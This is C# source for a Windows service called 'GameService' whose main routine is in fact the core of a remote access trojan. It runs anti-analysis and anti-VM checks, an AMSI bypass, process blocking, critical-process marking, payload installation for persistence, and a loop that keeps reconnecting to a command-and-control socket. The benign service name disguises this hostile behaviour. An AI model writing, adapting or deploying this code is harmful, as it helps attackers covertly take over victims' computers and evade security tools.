using GameService.Connection;
using GameService.Helper;
using GameService.Install;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace GameService
{
    public partial class GameService : ServiceBase
    {
        private Thread thread;
        private EventLog eventLog1;

        public GameService()
        {
            eventLog1 = new EventLog();
            // Turn off autologging

            this.AutoLog = false;
            // create an event source, specifying the name of a log that
            // does not currently exist to create a new, custom log
            if (!EventLog.SourceExists("GameService"))
            {
                EventLog.CreateEventSource(
                    "GameService", "GameServiceLog");
            }
            // configure the event log instance to use this source name
            eventLog1.Source = "Gameservice";
            eventLog1.Log = "GameServiceLog";

            InitializeComponent();
        }

        private void gameMain()
        {
            eventLog1.WriteEntry("Game Main.");
            for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
            {
                Thread.Sleep(1000);
            }

            if (!Settings.InitializeSettings()) Environment.Exit(0);
            try
            {
                if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
                    Anti_Analysis.RunAntiAnalysis();
            }
            catch { }
            A.B();//Amsi Bypass
            try
            {
                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                    Environment.Exit(0);
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.Anti_Process)) //run AntiProcess
                    AntiProcess.StartBlock();
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) //active critical process
                    ProcessCritical.Set();
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.In_stall)) //drop payload [persistence]
                    NormalStartup.Install();
            }
            catch { }
            Methods.PreventSleep(); //prevent pc to idle\sleep
            try
            {
                if (Methods.IsAdmin())
                    Methods.ClearSetting();
            }
            catch { }

            while (true) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch { }
                Thread.Sleep(5000);
            }
        }

        protected override void OnStart(string[] args)
        {
            eventLog1.WriteEntry("On Start.");
            thread = new Thread(new ThreadStart(gameMain));
            thread.Start();
        }

        protected override void OnStop()
        {
            eventLog1.WriteEntry("On Stop.");
            thread.Interrupt();
        }
    }
}
